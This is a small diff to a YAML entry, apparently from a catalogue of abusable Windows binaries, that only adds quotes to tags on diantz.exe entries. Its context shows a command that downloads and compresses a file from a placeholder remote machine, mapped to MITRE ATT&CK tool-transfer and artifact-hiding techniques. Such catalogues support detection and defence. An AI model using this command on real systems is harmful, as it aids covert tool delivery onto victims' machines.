@@ -11,7 +11,7 @@ Commands:
     Privileges: User
     MitreID: T1564.004
     OperatingSystem: Windows XP, Windows vista, Windows 7, Windows 8, Windows 8.1.
-    Tags: [Compress]
+    Tags: ['Compress']
   - Command: diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab
     Description: Download and compress a remote file and store it in a cab file on local machine.
     Usecase: Download and compress into a cab file.
@@ -19,7 +19,7 @@ Commands:
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019
-    Tags: [Compress]
+    Tags: ['Compress']
 Full_Path:
   - Path: c:\windows\system32\diantz.exe
   - Path: c:\windows\syswow64\diantz.exe
